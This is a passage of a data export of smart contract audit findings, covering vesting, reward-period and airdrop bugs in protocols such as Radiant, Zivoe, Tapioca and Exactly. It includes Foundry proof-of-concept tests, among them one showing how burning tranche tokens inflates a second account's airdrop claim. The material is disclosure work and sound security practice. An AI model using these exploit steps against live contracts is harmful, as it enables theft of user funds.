https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/6, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/34, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/66, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/79, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/90, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/132,  https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/149

**Evert0x**

Result:
High
Has Duplicates

**sherlock-admin3**

Escalations have been resolved successfully!

Escalation status:
- [midori-fuse](https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/157/#issuecomment-2025184779): accepted",Zap Protocol,dipp|0x4non|HonorLt|turvec|Silvermist|klaus|cats|enfrasico|ZdravkoHr.|Varun\_05|cawfree|bughuntoor|thank\_you|s1ce|UbiquitousComputing|psb01|0xhashiman|novaman33|0xR360|no|aman|mike-watson|denzi\_|AMOW|BengalCatBalu|404666|nilay27,HIGH,Reentrancy,8375 USDC,0,0,0,https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/157,,,https://app.sherlock.xyz/audits/contests/243,solodit_reports,,2024-04-22 21:12:33,2024-10-15 01:38:44,1,,
1775573,2b5bb6e0698014d73eec5f75e2bc3ea8,[H-01] `createVestingSchedule` can be front-ran by another holder of `ROLE_CREATE_SCHEDULE` role,Pashov Audit Group,2023-11-01,"**Severity**

**Impact:**
High, as vesting token balance can be stolen

**Likelihood:**
Medium, as it requires front-running

**Description**

The `createVestingSchedule` method of `TokenVestingV2` expects to have a pre-transferred balance before initializing a vesting schedule. The problem with the current contract version is that multiple accounts can hold the `ROLE_CREATE_SCHEDULE` role. Since two transactions are expected to create a vesting schedule (transferring funds to the `TokenVestingV2` contract and then calling `createVestingSchedule`) this means that between them another holder of the role can come in and create a vesting schedule of his own (with himself as beneficiary for example, non-revokable with just 7 days of duration) and in this way steal the funds of the other role holder.

**Recommendations**

Either change `createVestingSchedule` to itself transfer the vesting schedule tokens from the caller to the contract or make it callable by just 1 address",Yhairvesting,Pashov,HIGH,,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-11-01-yHairVesting.md,,,solodit_reports,,2024-04-30 00:21:27,2024-10-15 00:48:02,1,,
1776103,9a36ab3b7e4b32d593de525ed3398443,Bounty Hunters Can Incur a Denial-of-Service,OpenZeppelin,2023-10-18,"Successful bounty hunters are expected to [claim](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/eligibility/BountyManager.sol#L147-L157) a large number of bounties per day. The larger the protocol grows, the more situations will arise for hunters to get a reward for ensuring the protocol works as expected.


These bounties are paid out in RDNT tokens, but not directly to the hunter's wallet. Instead, [these tokens go into a 90-day vesting period](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/eligibility/BountyManager.sol#L283-L306). In order to track penalties for each individual amount in vesting, every bounty needs to be separately added to the hunter's earnings array.


A successful bounty hunter can potentially claim a very large amount of bounties within the same 90-day period (before vesting ends for his first bounty), causing the [`userEarnings`](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/staking/MultiFeeDistribution.sol#L84) array to be so large that any interaction with it on a transaction will fail due to running out of gas because it has reached the block gas limit. When this happens, hunters will not be able to withdraw their earnings or perform static calls to the [`earnedBalances`](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/staking/MultiFeeDistribution.sol#L472-L481) function, essentially bricking protocol interactions for that specific user.


The same effect can be achieved by a malicious actor performing a grieving attack on any account by [claiming](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/staking/ChefIncentivesController.sol#L466) numerous times on behalf of a victim's address since there is no minimum amount claimable and there is no access control enforced when claiming rewards.


In order to avoid a denial of service on regular users, consider increasing the minimum amount claimable to a reasonable threshold. Additionally, consider enforcing access control on the claiming functionality if necessary.


Regarding bounty hunters, in order to prevent them from incurring a denial-of-service, consider implementing an alternate solution to how bounties are added to the `userEarnings` array. For example, the same array item could be used to combine multiple bounty amounts claimed within the same day.


***Update:** Resolved in [pull request #201](https://github.com/radiant-capital/v2-core/pull/201) at commits [42c6772](https://github.com/radiant-capital/v2-core/commit/42c6772947ccd88443731311db442ab219824285), [bec761e](https://github.com/radiant-capital/v2-core/commit/bec761eb8858b1fd124a3898ae6d0430a3797ef7), [5b43456](https://github.com/radiant-capital/v2-core/commit/5b434563b238df81c92c66895a4b57d06e1328d6), [82d6503](https://github.com/radiant-capital/v2-core/commit/82d6503e8615112d1e8ddf06bd9f88150998c346), [d4c1489](https://github.com/radiant-capital/v2-core/commit/d4c1489904919ab9fd0299ac3d4dde0d06bfcaca) and [814adc6](https://github.com/radiant-capital/v2-core/commit/814adc6876da665dd230faf474937ba76c3c34b6). Claims of 0 RDNT are disallowed and a 1-day epoch system has been implemented so that both RDNT claims and LP locks of the same type happening on the same day are merged within 1 entry. LP locks aggregation only takes place if the current lock will unlock on the exact same day as the last lock from the user list. This strategy makes the protocol more gas efficient and protects both users and bounty hunters from denial-of-service attacks by limiting the number of entries in both arrays.*",Radiant V2 Audit,OpenZeppelin,HIGH,,,0,0,0,,https://blog.openzeppelin.com/radiant,,,solodit_reports,5354427c3df84625390aa3013d09b603,2024-05-28 00:30:20,2024-10-15 00:41:17,1,,
1776105,6a10dd02a0fb4867ab255c1a9cafedae,Incorrect Accounting of earned and unlocked Tokens on exit May Brick the Protocol,OpenZeppelin,2023-10-18,"The [`exit`](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/staking/MultiFeeDistribution.sol#L927-L937) function within the `MultiFeeDistribution` contract is responsible for withdrawing RDNT tokens (earnings) that are already unlocked and still in vesting. It is using [`withdrawableBalance`](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/staking/MultiFeeDistribution.sol#L929) to calculate the balance that can be withdrawn, and then it releases the tokens to the user via [`_withdrawTokens`](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/staking/MultiFeeDistribution.sol#L936).


While the function is correctly deleting [`userEarnings`](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/staking/MultiFeeDistribution.sol#L931), it is not updating the `unlocked` and `earned` balances to `0`, which is where the [`withdrawableBalance`](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/staking/MultiFeeDistribution.sol#L522-L541) function gets the data from.


A regular call to `exit` will break that user's internal accounting for earnings and lockings, leading to reverts for crucial functionalities of the system and thus, causing unexpected results and potentially bricking most of the `MultiFeeDistribution` contract alongside other parts of the protocol.


The following features will be impacted by the incorrect value of earned or unlocked tokens:


* The [`exit`](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/staking/MultiFeeDistribution.sol#L927-L937) function will be reverting when updating the value of [`total`](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/staking/MultiFeeDistribution.sol#L934).
* The [`withdrawableBalance`](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/staking/MultiFeeDistribution.sol#L522-L540) function will be returning an incorrect value.
* The [`withdraw`](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/staking/MultiFeeDistribution.sol#L805-L862) function will be reverting when updating value of [`total`](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/staking/MultiFeeDistribution.sol#L859).
* The [`earnedBalances`](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/staking/MultiFeeDistribution.sol#L479-L505) function will be returning anincorrect value.


In order to maintain a correct internal accounting of user balances, it is recommended to reset both the `unlocked` and `earned` balances to `0` in the [`exit`](https://github.com/radiant-capital/v2-core/blob/e8f21f103e17736907b62809d1ad902febc53714/contracts/radiant/staking/MultiFeeDistribution.sol#L927-L937) function.


***Update:** Resolved in [pull request #66](https://github.com/radiant-capital/v2-core/pull/66) at commit [1830760](https://github.com/radiant-capital/v2-core/commit/18307607b7491c8bb3fb7cfbb253aa40fc49060e). Both `unlocked` and `earned` values are now reset to `0` within the `exit` function.*",Radiant V2 Audit,OpenZeppelin,HIGH,,,0,0,0,,https://blog.openzeppelin.com/radiant,,,solodit_reports,5354427c3df84625390aa3013d09b603,2024-05-28 00:30:38,2024-10-15 00:41:34,1,,
1776132,b88b557c75718dfd7dac17e26c66aba6,Unrestricted Minting of esEXA Tokens,OpenZeppelin,2023-10-27,"The [`EscrowedEXA`](https://github.com/exactly/protocol/blob/1dfca200ff82a964ed34b7429656a05b013dfb5d/contracts/periphery/EscrowedEXA.sol) contract does not verify the origin or the asset of the Sablier stream expected to be canceled. Cancellation can happen through `EscrowedEXA`'s [`cancel`](https://github.com/exactly/protocol/blob/1dfca200ff82a964ed34b7429656a05b013dfb5d/contracts/periphery/EscrowedEXA.sol#L120-L125) function or directly through the Sablier protocol. Depending on what was set as `stream.sender` and `stream.recipient`, the [`onStreamCanceled`](https://github.com/exactly/protocol/blob/1dfca200ff82a964ed34b7429656a05b013dfb5d/contracts/periphery/EscrowedEXA.sol#L169-L172) hook will be called by Sablier's smart contracts. This leads to a scenario where an attacker can create a vesting stream directly through the Sablier protocol and then force its processing via the `EscrowedEXA` contract, resulting in the minting of `esEXA` tokens to the attacker, without the corresponding `EXA` tokens reaching the `EscrowedEXA` contract.


There are two exploitation scenarios that start with the attacker deploying a bogus ERC-20 token.


In the first scenario, a malicious stream is created with the attacker set as the sender and the `EscrowedEXA` contract set as the recipient. Upon the attacker canceling the stream directly through Sablier, the [`onStreamCanceled`](https://github.com/exactly/protocol/blob/1dfca200ff82a964ed34b7429656a05b013dfb5d/contracts/periphery/EscrowedEXA.sol#L169-L172) function is invoked, allowing the attacker to mint `esEXA` tokens. This scenario is also possible if the roles are reversed, with the attacker set as the recipient and the `EscrowedEXA` contract set as the sender.


The second scenario involves creating a stream with the `EscrowedEXA` contract set as the sender and the attacker as the recipient. Calling the [`cancel`](https://github.com/exactly/protocol/blob/1dfca200ff82a964ed34b7429656a05b013dfb5d/contracts/periphery/EscrowedEXA.sol#L120-L125) function of the `EscrowedEXA` contract results in the minting of `esEXA` tokens.


Consider adding a mapping that identifies streams created by the `EscrowedEXA` contract. Upon cancellation, verify the `streamId` in the [`cancel`](https://github.com/exactly/protocol/blob/1dfca200ff82a964ed34b7429656a05b013dfb5d/contracts/periphery/EscrowedEXA.sol#L120-L125) function and the [`onStreamCanceled`](https://github.com/exactly/protocol/blob/1dfca200ff82a964ed34b7429656a05b013dfb5d/contracts/periphery/EscrowedEXA.sol#L169-L172) hook, ensuring that only the streams created by the `EscrowedEXA` contract are processed successfully.


***Update:** Resolved in [pull request #672](https://github.com/exactly/protocol/pull/672) at commit [0182437](https://github.com/exactly/protocol/commit/0182437051ce3c57cbcc3c60e56fe6ae959ea1ed).*",Exactly EscrowedExa Audit,OpenZeppelin,HIGH,,,0,0,0,,https://blog.openzeppelin.com/exactly-escrowedexa-audit,,,solodit_reports,9438ec6cd0b923034d4063fe21c9b884,2024-05-28 00:33:55,2024-10-15 00:46:20,1,"function onStreamCanceled(uint256, address recipient, uint128 senderAmount, uint128) external {
    assert(msg.sender == address(sablier));
    _mint(recipient, senderAmount);
  }
```
  function cancel(uint256[] memory streamIds) external returns (uint256 streamsReserves) {
    uint128 refundableAmount;
    (streamsReserves, refundableAmount) = _cancel(streamIds);
    _mint(msg.sender, refundableAmount);
    exa.safeTransfer(msg.sender, streamsReserves);
  }",
1776418,6c9b9beeeeaeab6931867c604cf28861,[H-05] `_vested()` claimable amount calculation error,Code4rena,2024-02-26,"The `Vesting._vested()` method is used to calculate the maximum claimable amount for the current user. The calculation formula is as follows: `(_totalAmount * (block.timestamp - _start)) / _duration`. If there is an `__initialUnlockTimeOffset`, it needs to be subtracted from `_start` before performing the calculation, i.e., `_start = _start - __initialUnlockTimeOffset`.

```solidity
    function _vested(uint256 _totalAmount) internal view returns (uint256) {
        uint256 _cliff = cliff;
        uint256 _start = start;
        uint256 _duration = duration;

        if (_start == 0) return 0; // Not started

        if (_cliff > 0) {
            _start = _start + _cliff; // Apply cliff offset
            if (block.timestamp < _start) return 0; // Cliff not reached
        }

@>      if (block.timestamp >= _start + _duration) return _totalAmount; // Fully vested

        _start = _start - __initialUnlockTimeOffset; // Offset initial unlock so it's claimable immediately
        return (_totalAmount * (block.timestamp - _start)) / _duration; // Partially vested
    }
```

The issue with the code snippet above is that the check for being ""Fully vested"" is incorrect; it does not take into account the `__initialUnlockTimeOffset`. The correct approach should be:
`if (block.timestamp >= _start - __initialUnlockTimeOffset + _duration) return _totalAmount;// Fully vested`. Resulting in calculations that may be greater than the maximum number `_totalAmount`

Example:
`_totalAmount  =  500 ,  duration = 1000 __initialUnlockTimeOffset = 100 start = 1000  block.timestamp= 1999` because `block.timestamp < start + duration`  (`1999 < 1000 + 1000`) it will not return `Fully vested`.

Final calculation result:
start = `start - __initialUnlockTimeOffset = 1000 - 100 = 900`.
return = `(_totalAmount * (block.timestamp - _start)) / _duration = 500 * (1999 - 900) / 1000 = 549.5`.

It is greater 49.5 than the maximum `_totalAmount=500`.

### Impact

Users can `claim' more than they should.

### Recommended Mitigation

```diff
    function _vested(uint256 _totalAmount) internal view returns (uint256) {
        uint256 _cliff = cliff;
        uint256 _start = start;
        uint256 _duration = duration;

        if (_start == 0) return 0; // Not started

        if (_cliff > 0) {
            _start = _start + _cliff; // Apply cliff offset
            if (block.timestamp < _start) return 0; // Cliff not reached
        }

-       if (block.timestamp >= _start + _duration) return _totalAmount; // Fully vested
+       if (block.timestamp >= _start -  __initialUnlockTimeOffset + _duration) return _totalAmount; // Fully vested

        _start = _start - __initialUnlockTimeOffset; // Offset initial unlock so it's claimable immediately
        return (_totalAmount * (block.timestamp - _start)) / _duration; // Partially vested
    }
```
**[cryptotechmaker (Tapioca) confirmed, but disagreed with severity and commented via duplicate Issue #167](https://github.com/code-423n4/2024-02-tapioca-findings/issues/167#issuecomment-2034003168)**
> PR [here](https://github.com/Tapioca-DAO/tap-token/pull/175).

***",Tapioca DAO,immeas|bin2chen|ronnyx2017|deadrxsezzz|KIntern\_NA,HIGH,,138000,0,0,0,https://github.com/code-423n4/2024-02-tapioca-findings/issues/111,https://code4rena.com/reports/2024-02-tapioca,,https://code4rena.com/reports/2024-02-tapioca,solodit_reports,a1087225023137058ff3be597c6ad3a6,2024-05-28 01:08:30,2024-10-15 01:22:02,1,,Cross Chain
1776520,4d81c73684d90ab0b7377d5e51e77254,H-1: Anyone could call `depositReward` with zero reward to extend the period finish time,Sherlock,2024-04-25,"# Issue H-1: Anyone could call `depositReward` with zero reward to extend the period finish time 

Source: https://github.com/sherlock-audit/2024-03-zivoe-judging/issues/11 

## Found by 
0brxce, 0xAnmol, 0xboriskataa, 0xpiken, 0xvj, 14si2o\_Flint, 9oelm, AMOW, Afriaudit, Bauer, CL001, Dliteofficial, Drynooo, FastTiger, Ironsidesec, Krace, Kunhah, Maniacs, Nihavent, Ruhum, SilverChariot, Timenov, Tychai0s, amar, araj, asui, blockchain555, cergyk, coffiasd, dany.armstrong90, dimulski, forgebyola, heedfxn, jasonxiale, joicygiore, krikolkk, lemonmon, marchev, mt030d, novaman33, pashap9990, rbserver, sakshamguruji, sl1, sunill\_eth, t0x1c
## Summary

Anyone could extend the reward finish time, potentially resulting in users receiving fewer rewards than expected within the same time period.

## Vulnerability Detail

The function `depositReward` can be called by anyone, even with zero rewards, allowing it to be exploited to extend the reward finish time at little cost. 
This could result in loss of rewards; for instance, if there are 10 DAI rewards within a 10-day period, a malicious user could extend the finish time on *day 5*, extending the finish time to the 15th day. Participants would only receive 7.5 DAI by the 10th day.

```solidity
    function depositReward(address _rewardsToken, uint256 reward) external updateReward(address(0)) nonReentrant {
        IERC20(_rewardsToken).safeTransferFrom(_msgSender(), address(this), reward);

        // Update vesting accounting for reward (if existing rewards being distributed, increase proportionally).
        if (block.timestamp >= rewardData[_rewardsToken].periodFinish) {
            rewardData[_rewardsToken].rewardRate = reward.div(rewardData[_rewardsToken].rewardsDuration);
        } else {
            uint256 remaining = rewardData[_rewardsToken].periodFinish.sub(block.timestamp);
            uint256 leftover = remaining.mul(rewardData[_rewardsToken].rewardRate);
            rewardData[_rewardsToken].rewardRate = reward.add(leftover).div(rewardData[_rewardsToken].rewardsDuration);
        }

        rewardData[_rewardsToken].lastUpdateTime = block.timestamp;
        rewardData[_rewardsToken].periodFinish = block.timestamp.add(rewardData[_rewardsToken].rewardsDuration);
        emit RewardDeposited(_rewardsToken, reward, _msgSender());
    }
```

### POC
Add the test to `zivoe-core-testing/src/TESTS_Core/Test_ZivoeRewards.sol` and run it with `forge test --match-test test_ZivoeRewards_deposit_zero --rpc-url <RPC_URL_MAINNET>`

```diff
diff --git a/zivoe-core-testing/src/TESTS_Core/Test_ZivoeRewards.sol b/zivoe-core-testing/src/TESTS_Core/Test_ZivoeRewards.sol
index f5353b6..870a531 100644
--- a/zivoe-core-testing/src/TESTS_Core/Test_ZivoeRewards.sol
+++ b/zivoe-core-testing/src/TESTS_Core/Test_ZivoeRewards.sol
@@ -685,6 +685,33 @@ contract Test_ZivoeRewards is Utility {

     }

+    function test_ZivoeRewards_deposit_zero() public {
+
+        depositReward_DAI(address(stZVE), 1);
+
+        (
+            uint256 rewardsDuration,
+            uint256 _prePeriodFinish,
+            uint256 _preRewardRate,
+            uint256 lastUpdateTime,
+            uint256 rewardPerTokenStored
+        ) = stZVE.rewardData(DAI);
+        console.log(""period finish "", _prePeriodFinish);
+
+        vm.warp(block.timestamp + 1 days);
+
+        depositReward_DAI(address(stZVE), 0);
+
+        (,
+            uint256 _afterPeriodFinish,
+            ,
+            ,
+        ) = stZVE.rewardData(DAI);
+        console.log(""period finish "", _afterPeriodFinish);
+        //  extend the Finish 1 day
+        assertEq(_afterPeriodFinish - _prePeriodFinish, 1 days);
+    }
+
     function test_ZivoeRewards_getRewards_works(uint96 random) public {

         uint256 deposit = uint256(random) + 100 ether; // Minimum 100 DAI deposit.
```

## Impact

Anyonce could extend the reward finish time and the users may receive less rewards than expected during the same time period.

## Code Snippet

https://github.com/sherlock-audit/2024-03-zivoe/blob/d4111645b19a1ad3ccc899bea073b6f19be04ccd/zivoe-core-foundry/src/ZivoeRewards.sol#L228-L243

## Tool used

Foundry

## Recommendation
Only specific users are allowed to call function `depositReward`



## Discussion

**pseudonaut**

Valid, considering adding whitelist

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**panprog** commented:
> high, allows anyone to extend reward finish time indefinitely and decrease reward rate.



**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Zivoe/zivoe-core-foundry/pull/260",Zivoe,Ruhum|rbserver|lemonmon|sakshamguruji|Bauer|cergyk|jasonxiale|Krace|Timenov|0xvj|14si2o\_Flint|sl1|dimulski|dany.armstrong90|0xpiken|asui|coffiasd|marchev|araj|t0x1c|Drynooo|CL001|joicygiore|FastTiger|novaman33|Dliteofficial|krikolkk|sunill\_eth|Afriaudit|forgebyola|AMOW|Ironsidesec|0xboriskataa|Tychai0s|0brxce|blockchain555|mt030d|pashap9990|amar|9oelm|Kunhah|SilverChariot|0xAnmol|heedfxn|Nihavent|Maniacs,HIGH,Access Control,47500 USDC,0,0,0,https://github.com/sherlock-audit/2024-03-zivoe-judging/issues/11,,,https://app.sherlock.xyz/audits/contests/280,solodit_reports,,2024-05-28 01:22:11,2024-10-15 01:47:35,1,,
1776521,a2b711c52e54e694716587816e07ebc7,H-2: ITO can be manipulated,Sherlock,2024-04-25,"# Issue H-2: ITO can be manipulated 

Source: https://github.com/sherlock-audit/2024-03-zivoe-judging/issues/12 

## Found by 
0xShax2nk.in, 0xpiken, 0xvj, 14si2o\_Flint, 9oelm, AMOW, Drynooo, Ironsidesec, JigglypuffAndPikachu, KupiaSec, Nihavent, SilverChariot, Tendency, blockchain555, coffiasd, dany.armstrong90, didi, ether\_sky, hulkvision, joicygiore, lemonmon, mt030d, saidam017, sl1, zarkk01
## Summary
The ITO allocates 3 pZVE tokens per senior token minted and 1 pZVE token per junior token minted. When the offering period ends, users can claim the protocol `ZVE token` depending on the share of all pZVE they hold. Only 5% of the total ZVE tokens will be distributed to users, which is equal to `1.25M` tokens.

The ITO can be manipulated because it  uses `totalSupply()` in its calculations.
## Vulnerability Detail
[`ZivoeITO.claimAirdrop()`](https://github.com/sherlock-audit/2024-03-zivoe/blob/d4111645b19a1ad3ccc899bea073b6f19be04ccd/zivoe-core-foundry/src/ZivoeITO.sol#L223-L228) calculates the amount of ZVE tokens that should be vested to a certain user. It then creates a vesting schedule and sends all junior and senior tokens to their recipient.

The formula is $pZVEOwned/pZVETotal * totalZVEAirdropped$ (in the code these are called `upper`, `middle` and `lower`).

```solidity
        uint256 upper = seniorCreditsOwned + juniorCreditsOwned;
        uint256 middle = IERC20(IZivoeGlobals_ITO(GBL).ZVE()).totalSupply() / 20;
        uint256 lower = IERC20(IZivoeGlobals_ITO(GBL).zSTT()).totalSupply() * 3 + (
            IERC20(IZivoeGlobals_ITO(GBL).zJTT()).totalSupply()
        );
```

These calculations can be manipulated because they use `totalSupply()`.  The tranche tokens have a public [`burn()`](https://github.com/sherlock-audit/2024-03-zivoe/blob/d4111645b19a1ad3ccc899bea073b6f19be04ccd/zivoe-core-foundry/src/ZivoeTrancheToken.sol#L72) function.

An attacker can use 2 accounts to enter the ITO. They will deposit large amounts of stablecoins towards the senior tranche. When the airdrop starts, they can claim their senior tokens and start vesting ZVE tokens. The senior tokens can then be burned. Now, when the attacker calls the `claimAirdrop` function with their second account, the denominator of the above equation will be much smaller, allowing them to claim much more ZVE tokens than they are entitled to.

## Impact
There are 2 impacts from exploiting this vulnerability:
 - a malicious entity can claim excessively large part of the airdrop and gain governance power in the protocol
 - since the attacker would have gained unexpectedly large amount of ZVE tokens and the total ZVE to be distributed will be `1.25M`, the users that claim after the attacker may not be able to do so if the amount they are entitled to, added to the stolen ZVE, exceeds `1.25M`.

## Code Snippet
Add this function to [`Test_ZivoeITO.sol`](https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-testing/src/TESTS_Core/Test_ZivoeITO.sol) and import the `console`.

You can comment the line where Sue burns their tokens and see the differences in the logs.

```solidity
    function test_StealZVE() public {
        // Sam is an honest actor, while Bob is a malicious one
        mint(""DAI"", address(sam), 3_000_000 ether);
        mint(""DAI"", address(bob), 2_000_000 ether);
        zvl.try_commence(address(ITO));

        // Bob has another Ethereum account, Sue
        bob.try_transferToken(DAI, address(sue), 1_000_000 ether);
        
        // give approvals
        assert(sam.try_approveToken(DAI, address(ITO), type(uint256).max));
        assert(bob.try_approveToken(DAI, address(ITO), type(uint256).max));
        assert(sue.try_approveToken(DAI, address(ITO), type(uint256).max));

        // Sam deposits 2M DAI to senior tranche and 400k to the junior one
        hevm.prank(address(sam));
        ITO.depositBoth(2_000_000 ether, DAI, 400_000, DAI);
       
        // Bob deposits 2M DAI into the senior tranche using his both accounts
        hevm.prank(address(bob));
        ITO.depositSenior(1_000_000 ether, DAI);

        hevm.prank(address(sue));
        ITO.depositSenior(1_000_000 ether, DAI);

        // Move the timestamp after the end of the ITO
        hevm.warp(block.timestamp + 31 days);
        
        ITO.claimAirdrop(address(sue));
        (, , , uint256 totalVesting, , , ) = vestZVE.viewSchedule(address(sue));

        // Sue burn all senior tokens
        vm.prank(address(sue));
        zSTT.burn(1_000_000 ether);

        console.log('Sue vesting: ', totalVesting / 1e18);

        ITO.claimAirdrop(address(bob));
        (, , , totalVesting, , , ) = vestZVE.viewSchedule(address(bob));

        console.log('Bob vesting: ', totalVesting / 1e18);

        ITO.claimAirdrop(address(sam));
        (, , , totalVesting, , , ) = vestZVE.viewSchedule(address(sam));

        console.log('Sam vesting: ', totalVesting / 1e18);
    }
```


Fair vesting without prior burning
```solidity
  Sue vesting:  312499
  Bob vesting:  312499
  Sam vesting:  625001
```

Vesting after burning
```solidity
  Sue vesting:  312499
  Bob vesting:  416666
  Sam vesting:  833333
```

Bob and Sue will be able to claim `~750 000` ZVE tokens and Sam will not be able to claim any, because the total exceeds `1.25M`.
## Tool used

Manual Review

## Recommendation
Introduce a few new variables in the ITO contract.
```solidity
   bool hasAirdropped;
   uint256 totalZVE;
   uint256 totalzSTT; 
   uint256 totalzJTT;
```

Then check if the call to `claimAidrop` is a first one and if it is, initialize the variables. Use these variables in the vesting calculations.

```solidity
    function claimAirdrop(address depositor) external returns (
        uint256 zSTTClaimed, uint256 zJTTClaimed, uint256 ZVEVested
    ) {
            ...
            if (!hasAirdropped) {
                  totalZVE = IERC20(IZivoeGlobals_ITO(GBL).ZVE()).totalSupply();
                  totalzSTT = IERC20(IZivoeGlobals_ITO(GBL).zSTT()).totalSupply();
                  totalzJTT = IERC20(IZivoeGlobals_ITO(GBL).zJTT()).totalSupply();
                  hasAirdropped = true;
            }
            ...

           uint256 upper = seniorCreditsOwned + juniorCreditsOwned;
           uint256 middle = totalZVE / 20;
           uint256 lower = totalzSTT * 3 + totalzJTT;
      }
```



## Discussion

**pseudonaut**

This is interesting - technically we can support overflow in these situations because there's more ZVE available in other contract. User's would need to burn important tokens, and lock-up capital for extended period of time (more than 1 block) and upside isn't present against what rewards are and capital-loss - net-positive for protocol

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**panprog** commented:
> high, allows to inflate ITO vesting amounts and cause loss of funds from ITO for the other users



**panprog**

Many dups of this issue talk about naturally increasing `totalSupply` due to new deposits, which decreases airdrop for users who start vesting later. The core reason is the same.

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Zivoe/zivoe-core-foundry/pull/266",Zivoe,lemonmon|saidam017|0xvj|14si2o\_Flint|Tendency|sl1|dany.armstrong90|KupiaSec|ether\_sky|0xpiken|coffiasd|Drynooo|joicygiore|AMOW|hulkvision|Ironsidesec|didi|zarkk01|blockchain555|mt030d|9oelm|SilverChariot|JigglypuffPikachu|Nihavent|0xShax2nk.in,HIGH,,47500 USDC,0,0,0,https://github.com/sherlock-audit/2024-03-zivoe-judging/issues/12,,,https://app.sherlock.xyz/audits/contests/280,solodit_reports,,2024-05-28 01:22:15,2024-10-15 01:47:39,1,"// Calculate proportion of $ZVE awarded based on $pZVE credits.
        uint256 upper = seniorCreditsOwned + juniorCreditsOwned;
        uint256 middle = IERC20(IZivoeGlobals_ITO(GBL).ZVE()).totalSupply() / 20;
        uint256 lower = IERC20(IZivoeGlobals_ITO(GBL).zSTT()).totalSupply() * 3 + (
            IERC20(IZivoeGlobals_ITO(GBL).zJTT()).totalSupply()
        );
```
    function burn(uint256 amount) external { _burn(_msgSender(), amount); }",
1776522,60575ae6ab45acc64149dcb619fb301a,H-4: Revoking vesting schedule does not subtract user votes correctly,Sherlock,2024-04-25,"# Issue H-4: Revoking vesting schedule does not subtract user votes correctly 

Source: https://github.com/sherlock-audit/2024-03-zivoe-judging/issues/118 

## Found by 
0xAnmol, 0xpiken, 0xvj, 9oelm, Afriaudit, Ironsidesec, JigglypuffAndPikachu, KingNFT, KupiaSec, Ruhum, SilverChariot, Tendency, Tychai0s, Varun\_05, amar, denzi\_, dimulski, ether\_sky, lemonmon, marchev, mt030d, rbserver, saidam017, sakshamguruji, samuraii77
## Summary
[ZivoeVestingRewards.revokeVestingSchedule()](https://github.com/sherlock-audit/2024-03-zivoe/blob/d4111645b19a1ad3ccc899bea073b6f19be04ccd/zivoe-core-foundry/src/ZivoeRewardsVesting.sol#L429-L467) should reduce the voting power of the user with the withdrawable amount plus the revoked amount. However, it reduces it only by the withdrawable amount.

## Vulnerability Detail
When called, `revokeVestingSchedule()` fetches the withdrawable amount by the user at that moment.
```solidity
        uint256 amount = amountWithdrawable(account);
```

The revoke logic is executed and the user's checkpoint value is decreased by `amount`.
```solidity
        _writeCheckpoint(_checkpoints[account], _subtract, amount);
```

The code ignores the amount that's being revoked and the user keeps more voting power than he has to.
Imagine the following:
`totalVested = 1000`
`withdrawable = 0`

If the schedule gets revoked, the user's checkpoint value will not be decreased at all because there is nothing to be withdrawn. The user can later use their voting power to vote on governance proposals.

In fact, `amountWithdrawable(account)` being close to 0 has a very high likelihood because:
   - the user can frontrun the transaction and withdraw the tokens they are entitled to
   -  it's highly likely that a vesting schedule will be removed shortly after creating it.

However, even if `amountWithdrawable()` is not equal to 0, the user would still be left with more voting power.
## Impact
Users keep voting power that must have been taken away.

## Code Snippet
POC to be run in [Test_ZivoeRewardsVesting.sol](https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-testing/src/TESTS_Core/Test_ZivoeRewardsVesting.sol)
```solidity
    function test_revoking_leaves_votes() public {
       assert(zvl.try_createVestingSchedule(
            address(vestZVE), 
            address(moe), 
            0, 
            360,
            6000 ether, 
            true
        ));
        // Vesting succeeded
        assertEq(vestZVE.balanceOf(address(moe)), 6000 ether);

        hevm.roll(block.number + 1);
     
        // User votes have increased
        assertEq(vestZVE.getPastVotes(address(moe), block.number - 1), 6000 ether);

        assert(zvl.try_revokeVestingSchedule(address(vestZVE), address(moe)));
        // Revoking succeeded
        assertEq(vestZVE.balanceOf(address(moe)), 0);

        hevm.roll(block.number + 1);
        // User votes have not been decreased at all
        assertEq(vestZVE.getPastVotes(address(moe), block.number - 1), 6000 ether);
